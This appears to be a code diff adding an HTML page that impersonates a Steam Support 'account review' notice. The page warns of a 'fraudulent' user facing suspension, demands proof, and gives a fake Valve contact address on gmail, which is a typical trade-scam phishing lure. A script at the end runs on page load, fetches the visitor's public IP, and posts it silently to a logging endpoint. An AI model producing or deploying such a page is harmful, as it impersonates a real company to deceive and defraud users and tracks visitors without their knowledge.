@@ -1,0 +1,153 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Steam Support — 신고 안내</title>
+  <style>
+    :root{
+      --bg:#1b2838;
+      --panel:#2a475e;
+      --border:#3c5873;
+      --accent:#66c0f4;
+      --text:#c7d5e0;
+      --muted:#8fa6b7;
+      --warn:#b44040;
+    }
+    *{box-sizing:border-box;}
+    body{
+      margin:0;
+      font-family: "Motiva Sans", Inter, Segoe UI, Roboto, Arial, sans-serif;
+      background:var(--bg);
+      color:var(--text);
+      padding:40px 16px;
+    }
+    .container{max-width:820px;margin:0 auto;}
+    .top-title{font-size:26px;color:white;margin-bottom:16px;}
+    .breadcrumb{font-size:13px;color:var(--muted);margin-bottom:12px;}
+    .panel{
+      background:var(--panel);
+      border:1px solid var(--border);
+      padding:28px;
+      border-radius:4px;
+      box-shadow:0 0 20px rgba(0,0,0,0.35);
+      margin-top:18px;
+    }
+    .section-title{font-size:18px;font-weight:600;margin:20px 0 10px;color:white;}
+    .message-bar{
+      background:#5c9bd6;
+      padding:14px;
+      border-radius:4px;
+      color:white;
+      margin-bottom:20px;
+      font-size:15px;
+    }
+    .fraud-box{
+      background:#18222d;
+      border-left:5px solid var(--warn);
+      padding:18px;
+      border-radius:4px;
+      margin:20px 0;
+    }
+    .fraud-header{
+      background:var(--warn);
+      color:white;
+      font-weight:700;
+      padding:8px 12px;
+      margin-bottom:12px;
+      border-radius:3px;
+    }
+    .profile{
+      display:flex;
+      align-items:center;
+      gap:14px;
+      margin-bottom:14px;
+    }
+    .profile img{
+      width:64px;
+      height:64px;
+      border-radius:4px;
+      object-fit:cover;
+      border:1px solid #000;
+    }
+    .profile .name{
+      font-size:16px;
+      font-weight:600;
+      color:white;
+    }
+    p{line-height:1.6;margin:10px 0;color:var(--text);}
+    a{color:var(--accent);text-decoration:none;}
+    a:hover{text-decoration:underline;}
+    .footer-box{
+      margin-top:30px;
+      padding:14px;
+      background:#1f2f40;
+      border:1px solid var(--border);
+      border-radius:4px;
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+    .footer-box img{width:40px;height:40px;border-radius:3px;}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="top-title">Steam Support</div>
+    <div class="breadcrumb">Home > My Recent Help Requests > 계정 신고 검토</div>
+
+    <a style="color:var(--accent); font-size:14px;">Steam Account Review</a>
+
+    <div class="panel">
+      <div class="message-bar">Message from Steam Support · 4 hours ago</div>
+
+      <p>Hi there, Thank you for contacting our support team.</p>
+
+      <div class="fraud-header">Avoid this user — Fraudulent</div>
+
+      <div class="fraud-box">
+        <div class="profile">
+          <img src="profile.png" alt="profile" />
+          <div class="name">omega<br><span style="font-size:13px;color:var(--muted);">https://support.valveservice.mock/ticket/HT-4821-KQA2</span></div>
+        </div>
+
+        <p><strong>Current Report: Item Theft</strong></p>
+        <p>This Steam account will be taken action. Please know that this is concerning, this user has a high risk of losing access to his/her account and games if evidence is not properly provided for review.</p>
+        <p>Due to violating rules according to our Steam Service Protocol, this account has a pending ban before the full suspension.</p>
+        <p>More information is available here: <a>Steam Subscriber Agreement</a>, <a>Steam Service Protocol</a></p>
+      </div>
+
+      <p>If no valid proof will be sent, the reported account will be fully suspended within the time indicated. For appeal, please contact Steam Support.</p>
+
+      <div class="footer-box">
+        <img src="profile.png" />
+        <div>
+          <div style="font-weight:600; color:white;">Valve | Steam Support</div>
+          <div style="font-size:14px;color:var(--muted);">report.steampowered@gmail.com</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- IP 기록 기능 추가 -->
+  <script>
+    async function sendIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+
+        await fetch("http://localhost:4000/log-ip", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ ip: data.ip })
+        });
+
+        console.log("방문자 IP:", data.ip);
+      } catch (err) {
+        console.error("IP 전송 실패:", err);
+      }
+    }
+    sendIP();
+  </script>
+</body>
+</html>
